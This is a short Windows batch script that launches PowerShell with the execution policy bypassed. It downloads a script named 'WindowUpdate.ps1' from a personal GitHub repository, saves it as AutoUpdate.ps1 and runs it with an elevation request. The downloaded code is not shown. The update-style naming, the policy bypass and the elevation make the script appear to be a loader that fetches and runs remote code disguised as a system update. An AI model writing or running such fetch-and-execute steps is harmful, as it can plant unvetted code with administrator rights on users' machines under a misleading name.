start /wait powershell.exe -executionpolicy bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/rolaulten/501-YWE/main/WindowUpdate.ps1 -Outfile .\AutoUpdate.ps1"
start /wait powershell.exe -noprofile -executionpolicy bypass -Command "powershell.exe '.\AutoUpdate.ps1' -Verb runAs"
